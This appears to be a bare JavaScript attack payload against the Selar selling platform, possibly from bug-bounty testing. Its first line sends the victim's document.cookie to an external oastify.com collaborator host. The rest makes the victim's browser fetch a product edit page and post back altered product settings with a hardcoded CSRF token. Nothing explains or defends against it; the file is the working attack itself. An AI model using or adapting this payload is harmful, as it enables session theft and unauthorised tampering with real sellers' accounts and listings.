let currSession="";
fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/${document.cookie}`, {mode: 'no-cors',});
let xhr = new XMLHttpRequest();
xhr.    open('GET', 'https://selar.co/me/products/6434dt/edit', true);
xhr.setRequestHeader('Accept', 'text/html, application/xhtml+xml');
xhr.setRequestHeader('Accept-Language', 'en-US,en;q=0.5');
xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
xhr.setRequestHeader('X-Inertia', 'true');
xhr.setRequestHeader('X-Inertia-Version', '8a65e87f60dd2ec479d58b9ba018d458');
xhr.setRequestHeader('Content-Type', 'application/json;charset=utf-8');
xhr.onload = function () {
  if (xhr.status === 200) {
    const jsonResponse = JSON.parse(xhr.responseText);
    console.log(jsonResponse);
    fetch("https://selar.co/me/product/edit", {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json;charset=utf-8',
            'Accept': 'text/html, application/xhtml+xml'
          },
        body: JSON.stringify({
        "_token":"w7t2iUZDYiUSrqDM4OEJQV0AsniBLUBdnj0HSjKY",
        "code":jsonResponse.props.product['code'],
        "file_access_type":jsonResponse.props.product['file_access_type'],
        "donate":0,
        "give_access_to_file":jsonResponse.props.product['give_access_to_file'],
        "images":jsonResponse.props.product['image_urls'],
            "review_images":jsonResponse.props.product['review_images_urls'],
            "name":jsonResponse.props.product['name'],
            "description": jsonResponse.props.product['description'],
            "price":jsonResponse.props.product['price'],
            "stock":jsonResponse.props.product['stock'],
            "allow_flexi_subscription":jsonResponse.props.product['allow_flexi_subscription'],
            "show_original_price":jsonResponse.props.product['original_price'],
            "original_price":jsonResponse.props.product['original_price'],
            "prices":jsonResponse.props['sale_prices'],
            "minimum_amounts":jsonResponse.props['minimum_amounts'],
            "original_prices":jsonResponse.props['original_prices'],
            "pages":jsonResponse.props.product['pages'],
            "unlisted":jsonResponse.props.product['unlisted'],
            "subscription_interval":jsonResponse.props.product['subscription_interval'],
            "subscription_interval_frequency":jsonResponse.props.product['subscription_interval_frequency'],
            "custom_subscription_interval":jsonResponse.props.product['subscription_interval_frequency'],
            "subscription_limit":jsonResponse.props.product['subscription_limit'],
            "preorder":jsonResponse.props.product['preorder'],
            "preorder_releasedate":jsonResponse.props.product['preorder_releasedate'],
            "preorder_sample":jsonResponse.props.product['preorder_sample'],
            "files":jsonResponse.props.product['files'],
            "category_id":jsonResponse.props.product['category_id'],
            "sub_category_id":jsonResponse.props.product['sub_category_id'],
            "unlist_from_marketplace":0,
            "unlist_from_affiliate_network":jsonResponse.props.product['unlist_from_affiliate_network'],
            "affiliate_network_commission":jsonResponse.props.product['affiliate_network_commission'],
            "redirect":jsonResponse.props.product['redirect'],
            "published":jsonResponse.props.product['published'],
            "redirect_url":null,
            "preview_files":[],
            "custom_fields":[],
            "mailchimp_tags":jsonResponse.props['mailchimp_tags'],
            "external_integrations":jsonResponse.props.product['external_app_integrations_key_values'],
            "convertKit_tags":jsonResponse.props['convertkit_tags'],
            "mailerlite_tags":jsonResponse.props['mailerlite_tags'],
            "sendpulse_tags":jsonResponse.props['sendpulse_tags'],
            "groups":[],
            "subscription_variations":jsonResponse.props['subscription_variations'],
            "flexible_subscription_plans":[],
            "buy_button_label":jsonResponse.props.product['buy_button_label'],
            "requires_shipping_address":jsonResponse.props.product['requires_shipping_address'],
            "categories":jsonResponse.props['categories'],
            "cross_sells":jsonResponse.props['cross_sells'],
            "up_sells":jsonResponse.props['up_sells'],
            "event_type":jsonResponse.props.product['event_type'],
            "event_start_date_and_time":jsonResponse.props.product['event_start_date_and_time'],
            "event_end_date_and_time":jsonResponse.props.product['event_end_date_and_time'],
            "enable_event_link":jsonResponse.props.product['enable_event_link'],
            "event_link":jsonResponse.props.product['event_link'],
            "extra_event_details":jsonResponse.props.product['extra_event_details'],
            "enable_event_address":jsonResponse.props.product['enable_event_address'],
            "show_event_address_before_payment":jsonResponse.props.product['show_event_address_before_payment'],
            "event_address":jsonResponse.props.product['event_address'],
            "event_is_recurring":jsonResponse.props.product['event_is_recurring'],
            "recurring_event_frequency":jsonResponse.props.product['recurring_event_frequency'],
            "tickets":jsonResponse.props.product['tickets'],
            "group":[],
            "viewonly":0,
            "convertkit_tags":jsonResponse.props['convertkit_tags'],
            "variable_groups":jsonResponse.props['variable_groups'],
            "timezone":"Africa/Lagos"
      })
    })
  } else {
    console.error('Request failed with status:', xhr.status);
  }
};
xhr.onerror = function () {
  console.error('There was a problem with the request.');
};
xhr.send(); 



